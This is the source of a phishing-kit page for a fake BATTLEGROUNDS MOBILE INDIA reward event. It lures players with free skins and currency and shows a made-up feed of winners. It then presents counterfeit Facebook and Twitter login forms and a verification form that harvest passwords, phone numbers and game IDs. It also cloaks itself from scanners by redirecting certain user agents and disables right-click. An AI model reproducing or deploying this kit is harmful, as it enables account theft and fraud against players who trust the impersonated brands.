<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="img/logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="img/navFb.png">
<img class="navbar-language" src="img/navIg.png">
<img class="navbar-language" src="img/navYt.png">
<div class="navbar-download"><img src="img/menu.png"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="event-title"></div> <!--- event-title --->
<div class="event-notification">
<div class="event-notification-txt">Rewards available until</div> <!--- event-notification-txt --->
<div class="event-notification-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div> <!--- event-notification-timer --->
</div> <!--- event-notification --->
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<div class="menu-wrapper">
<div class="eventRewardMenuWrapper">
<div class="menu-content menu-content-right-bg-off kanan" onmousedown="buka.play();" onclick="open_otherRewardMenu()"><div class="menu-content-txt">Other Reward</div></div> <!--- menu-content --->
<div class="menu-content menu-content-left-bg-on kiri" onmousedown="buka.play();"><div class="menu-content-txt">Event Reward</div></div> <!--- menu-content --->
</div> <!--- eventRewardMenu --->
<div class="otherRewardMenuWrapper" style="display: none;">
<div class="menu-content menu-content-right-bg-on kanan" onmousedown="buka.play();"><div class="menu-content-txt">Other Reward</div></div> <!--- menu-content --->
<div class="menu-content menu-content-left-bg-off kiri" onmousedown="buka.play();" onclick="open_eventRewardMenu()"><div class="menu-content-txt">Event Reward</div></div> <!--- menu-content --->
</div> <!--- otherRewardMenu --->
</div> <!--- menu-wrapper --->
<div class="box">
<center>
<div class="eventRewardMenuContent">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Marmoris X-Suit <br> (Permanent Ã—1)" value="" src="img/rewards/1.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Marmoris X-Suit <br> (Permanent Ã—1)" value="" src="img/rewards/2.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Fashionista Ink Set <br> (Permanent Ã—1)" value="" src="img/rewards/3.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Playing in WaterEmote <br> (Permanent Ã—1)" value="" src="img/rewards/4.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Molluscan Waverider Set <br> (Permanent Ã—1)" value="" src="img/rewards/5.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Summon Rain Emote <br> (Permanent Ã—1)" value="" src="img/rewards/6.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Auric Sentinel Helmet <br> (Permanent Ã—1)" value="" src="img/rewards/7.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Bejeweled Pearl Glider <br> (Permanent Ã—1)" value="" src="img/rewards/8.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Mystique Splendor Backpack <br> (Permanent Ã—1)" value="" src="img/rewards/9.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/10.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Pan - Oceanic Timepiece <br> (Permanent Ã—1)" value="" src="img/rewards/10.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/11.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Smoke Grenade - Pelagic <br> (Permanent Ã—1)" value="" src="img/rewards/11.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/12.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Kar98k - Billowing Mirage <br> (Permanent Ã—1)" value="" src="img/rewards/12.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">2</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/W5gC7b0/marmoris-Token.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Marmoris Token - 2" value="2" src="https://i.ibb.co/W5gC7b0/marmoris-Token.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">5</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/W5gC7b0/marmoris-Token.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Marmoris Token - 5" value="5" src="https://i.ibb.co/W5gC7b0/marmoris-Token.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">8</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/W5gC7b0/marmoris-Token.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Marmoris Token - 8" value="8" src="https://i.ibb.co/W5gC7b0/marmoris-Token.jpg">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="otherRewardMenuContent" style="display: none;">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/13.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Mummy Set <br> (Permanent Ã—1)" value="" src="img/rewards/13.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/14.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Psychophage Set <br> (Permanent Ã—1)" value="" src="img/rewards/14.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/15.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Underworld Guide Set <br> (Permanent Ã—1)" value="" src="img/rewards/15.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/16.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="M416 - The Fool <br> (Permanent Ã—1)" value="" src="img/rewards/16.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/17.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="M416 - Glacier <br> (Permanent Ã—1)" value="" src="img/rewards/17.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/18.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="M762 - Noctum Sunder <br> (Permanent Ã—1)" value="" src="img/rewards/18.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/19.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Aston Martin DBS Volante - Celestial Pink <br> (Permanent Ã—1)" value="" src="img/rewards/19.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">5000</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/j51XT8P/new-Bg-Mythic-Uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Unknown Cash - 5000" value="5000" src="https://i.ibb.co/j51XT8P/new-Bg-Mythic-Uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/20.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Aston Martin Valkyrie - Luminous Diamond <br> (Permanent Ã—1)" value="" src="img/rewards/20.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">28</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/TMqDPxX/new-Bg-Epic-New-Material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Material - 28" value="28" src="https://i.ibb.co/TMqDPxX/new-Bg-Epic-New-Material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/21.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Aston Martin DBS Volante - Deep Cosmos <br> (Permanent Ã—1)" value="" src="img/rewards/21.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">15</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/WvC37Vj/new-Bg-Epic-Starforge-Stone.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Starforge Stone - 15" value="15" src="https://i.ibb.co/WvC37Vj/new-Bg-Epic-Starforge-Stone.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">100</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/86NQ8rg/new-Bg-Epic-Star-Fragments.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Star Fragments - 100" value="100" src="https://i.ibb.co/86NQ8rg/new-Bg-Epic-Star-Fragments.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/22.jpg">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Serene Rapture Set <br> (Permanent Ã—1)" value="" src="img/rewards/22.jpg">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">20</div>
<img style="border-bottom: 0px;" src="https://i.ibb.co/tHjDx89/new-Bg-Epic-Paint.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" data-id="Paint - 20" value="20" src="https://i.ibb.co/tHjDx89/new-Bg-Epic-Paint.png">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="event-notification" style="padding-left: 0px; padding-right: 0px;">
<div class="event-notification-txt little-margin-top txt-center" style="padding-top: 18px; font-size: 17px;">
<div class="playerStatus">5883485425 collected Marmoris X-Suit</div> <!--- playerStatus --->
<div class="playerStatus">5295893347 collected Psychophage Set</div> <!--- playerStatus --->
<div class="playerStatus">5963737318 collected Mummy Set</div> <!--- playerStatus --->
<div class="playerStatus">5888686451 collected Pan - Oceanic Timepiece</div> <!--- playerStatus --->
<div class="playerStatus">5155030554 collected Underworld Guide Set</div> <!--- playerStatus --->
<div class="playerStatus">5154574574 collected Material - 28</div> <!--- playerStatus --->
<div class="playerStatus">6989436346 collected M416 - Glacier</div> <!--- playerStatus --->
<div class="playerStatus">6582156752 collected Molluscan Waverider Set</div> <!--- playerStatus --->
<div class="playerStatus">2364574555 collected M416 - The Fool</div> <!--- playerStatus --->
<div class="playerStatus">7457426233 collected UC - 5000</div> <!--- playerStatus --->
<div class="playerStatus">6324562571 collected Aston Martin DBS</div> <!--- playerStatus --->
<div class="playerStatus">9235235923 collected Material - 28</div> <!--- playerStatus --->
<div class="playerStatus">4584747457 collected Marmoris Token - 8</div> <!--- playerStatus --->
<div class="playerStatus">9568346347 collected Aston Martin Valkyrie</div> <!--- playerStatus --->
</div> <!--- event-notification-txt --->
</div> <!--- event-notification little-margin-top txt-center --->
<div class="footer">
<img class="footer-copyright-icon" src="img/footer.png">
<div class="footer-txt-copyright">© <?php echo $yearNow;?> KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct <br> | Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup account_login">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Login</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Login to receive your selected reward</div> <!--- popup-box-alert --->
<img class="popup-box-gamecon" src="img/gamecon.png">
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Twitter</button>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<img src="https://i.postimg.cc/9XrpfK2B/footer-ppua.png">
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup-login login_facebook" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.postimg.cc/3wBVgZTz/login-Method1.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="img/icon.png">
<p>Log in to your Facebook account to connect to BATTLEGROUNDS MOBILE INDIA</p>
<form class="form-group-fb" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" onclick="ValidateLoginFbData()">Log In</button>
</form>
<span>Create account</span>
<span>Not now</span>
<span>Forgotten password?</span>
</div> <!--- content-box-fb --->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
<div class="language-name">Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©</div> <!--- language-name --->
<div class="language-name">TÃ¼rkÃ§e</div> <!--- language-name --->
<div class="language-name">Tiáº¿ng Viá»‡t</div> <!--- language-name --->
<div class="language-name">æ—¥æœ¬èªž</div> <!--- language-name --->
<div class="language-name">EspaÃ±ol</div> <!--- language-name --->
<div class="language-name">PortuguÃªs (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div> <!--- copyright --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login login_facebook --->

<div class="popup-login login_twitter" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter"><img src="https://i.postimg.cc/dtyfWFF2/login-Method2.png"></div> <!--- header-twitter --->
<div class="content-box-twitter">
<span>Sign in to Twitter</span>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="email-twitter" autocomplete="off" required>
<label>Phone, email, or username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<input type="password" name="password" id="password-twitter" autocomplete="off" required>
<label>Password</label>
</div> <!--- form-group-twitter --->
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<label>Forgot password?</label>
<button type="submit" onclick="ValidateLoginTwitterData()">Log in</button>
<label>Don't have an account? <a>Sign up</a></label>
</form>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login login_twitter --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Reward Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<span class="rewardDenom"></span>
<img class="rewardPicture" src="">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<div class="popup-box-item-name rewardName"></div> <!--- popup-box-item-name --->
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_verification()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup otherReward_confirmation --->

<div class="popup account_verification" style="display: none;">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Complete your account detail</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<select style="margin-bottom: 20px;" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<script>
for(var i = 45; i <= 100; i++){
document.write("<option>" + i + "</option>");
};
</script>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
</div> <!--- popup-box-form-footer --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer" style="height: 40px;"></div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
Thanks for joining this event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-box-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="button" onmousedown="tutup.play();" onclick="location.href='https://www.battlegroundsmobileindia.com';">Logout</button>
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>
w    750.4  
h   9890.8  
9890.8

750.4

 

 

 

 

 

 

 

 

 

 

 

 

